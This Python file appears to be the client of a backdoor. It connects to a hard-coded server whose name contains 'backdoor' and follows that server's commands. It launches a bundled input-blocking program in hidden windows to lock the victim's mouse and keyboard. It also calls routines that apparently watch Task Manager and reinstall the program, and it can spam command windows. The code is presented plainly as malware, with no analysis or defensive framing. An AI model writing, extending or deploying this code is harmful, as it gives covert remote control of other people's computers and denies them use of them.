from implementations import *
from messagehandler import handle_message
import asyncio
import websockets  # type: ignore

current_exe = sys.executable

server_url = "wss://backdoor-freezeee.onrender.com"

async def pinger(ws):
    try:
        while True:
            await asyncio.sleep(5)
            await ws.send("PING")
    except asyncio.CancelledError:
        pass
    except Exception:
        pass

block_exe = resource_path("block_inputs.exe")
if not os.path.isfile(block_exe):
    sys.exit(1)

mouse_proc = None
keyboard_proc = None

startupinfo = subprocess.STARTUPINFO()
startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
startupinfo.wShowWindow = subprocess.SW_HIDE

creationflags = subprocess.CREATE_NO_WINDOW | subprocess.CREATE_NEW_PROCESS_GROUP

state = {
    "mouse": None,
    "keyboard": None,
}

monitor_taskmgr()
check_reinstall()

async def receiver(ws):
    try:
        async for msg in ws:
            handle_message(msg, block_exe, state, startupinfo, creationflags)
    except Exception:
        pass

def spam_terminals(number=3):
    for _ in range(number):
        subprocess.Popen("cmd")

async def main():
    print("Connecting to server...")
    ws = None

    while True:
        try:
            if ws is None or getattr(ws, "closed", True):
                ws = await websockets.connect(SERVER_URL)
                print("Connected")

                await ws.send(f"HELLO_{CLIENT_NAME}")
                response = await ws.recv()
                print("Received:", response)
                if response != "WELCOME":
                    print("Handshake failed")
                    try:
                        await ws.close()
                    except Exception:
                        pass
                    ws = None
                    await asyncio.sleep(5)
                    continue

                receiver_task = asyncio.create_task(receiver(ws))
                pinger_task = asyncio.create_task(pinger(ws))

                done, pending = await asyncio.wait([receiver_task, pinger_task], return_when=asyncio.FIRST_EXCEPTION)

                for t in pending:
                    t.cancel()

                try:
                    await ws.close()
                except Exception:
                    pass
                ws = None

            else:
                await asyncio.sleep(1)

        except Exception as e:
            print("Connection error:", e)
            try:
                if ws:
                    await ws.close()
            except Exception:
                pass
            ws = None
            await asyncio.sleep(5)


asyncio.run(main())
